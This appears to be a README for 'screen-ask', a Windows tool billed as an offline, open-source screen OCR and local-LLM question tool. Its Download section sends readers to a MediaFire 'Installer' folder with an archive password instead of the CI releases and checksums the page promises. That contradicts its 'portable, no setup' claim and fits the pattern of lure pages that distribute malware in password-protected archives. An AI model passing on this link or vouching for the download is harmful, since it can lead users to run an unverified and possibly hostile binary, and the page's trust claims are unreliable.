# screen-ask

👁️ Free, open-source ask-your-screen tool for Windows — capture a region, OCR and local LLM answer offline. 100 MB portable, no cloud, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Hotkey region capture** — press the shortcut, drag a box, the region becomes the question context
- ✅ **Built-in OCR** — text pulled from the shot with the Windows OCR engine or a bundled ONNX model
- ✅ **Local LLM answers** — connects to any llama.cpp server on localhost and asks about the captured content
- ✅ **Ask modes** — explain, translate, summarize or extract as a table with one dropdown
- ✅ **Answer clipboard flow** — the reply lands on the clipboard with enter, no window juggling
- ✅ **History strip** — last twenty captures with their questions, reopenable from the tray
- ✅ **100 MB self-contained exe** — runtime bundled, portable, offline, MIT with SHA-256 releases

## Why screen-ask

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **screen-ask** | PowerToys Text Extractor | Cloud screenshot AI | Snipping Tool OCR |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free, OSS | Paid | Free built-in |
| Open source | **Yes** | Yes | No | No |
| Asks questions about the screen | **Yes** | No | Yes | No |
| Screenshots stay local | **Yes** | Yes | No upload | Yes
| Local LLM backend | **Yes** | No | Impossible | No
| Portable, no install | **Yes, 100 MB** | Installer | Browser | Built-in

## FAQ

**how to ask AI about what is on my screen without screenshots going to a cloud?**

Cloud screenshot assistants upload whatever is on screen, which is a non-starter for documents and code under NDA. screen-ask OCRs a selected region locally and sends it to a local LLM server you run. It is a 100 MB portable exe, MIT, and works offline by design.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark overlay mid-capture (#121417, cyan #22D3EE): selection rectangle drawn over an error dialog, OCR preview chip below reading 38 words recognized.
2. Answer card floating near the tray: question text explain, answer paragraph streaming at 40 tokens per second, copy button highlighted.
3. History strip: twenty thumbnails with question labels, mode badges for translate and summarize, tray icon with badge count.

## Download

| Source | Link |
|---|---|
| 💾 **Installer screen-ask** | [Installer screen-ask](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).